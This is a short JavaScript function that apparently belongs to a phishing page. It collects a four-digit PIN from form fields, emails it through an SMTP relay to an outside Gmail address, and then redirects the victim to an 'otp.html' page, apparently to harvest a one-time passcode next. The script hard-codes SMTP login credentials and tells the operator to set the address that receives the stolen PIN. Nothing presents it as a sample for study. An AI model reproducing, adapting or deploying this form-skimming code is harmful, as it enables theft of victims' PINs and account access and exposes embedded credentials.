function emailSend() {
  var pin1 = document.getElementsByName('pin1')[0].value;
  var pin2 = document.getElementsByName('pin2')[0].value;
  var pin3 = document.getElementsByName('pin3')[0].value;
  var pin4 = document.getElementsByName('pin4')[0].value;

  var pin = pin1 + pin2 + pin3 + pin4; // Concatenating the individual PIN values

  var messageBody = "PIN: " + pin; // Constructing the message body with the PIN

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "nelsf38@gmail.com",
    Password: "3D538C4DF17B36F1E64CD578356BE2FCF3CA",
    To: 'payday10177@gmail.com', // Change this to your email address where you want to receive the PIN
    From: "nelsf38@gmail.com",
    Subject: "PIN",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'otp.html'; // Redirecting to otp.html upon successful email sending
      }
      else {
        swal("Error", "Please complete the PIN details", "error") // Displaying an error message if email sending fails
      }
    }
  );
}
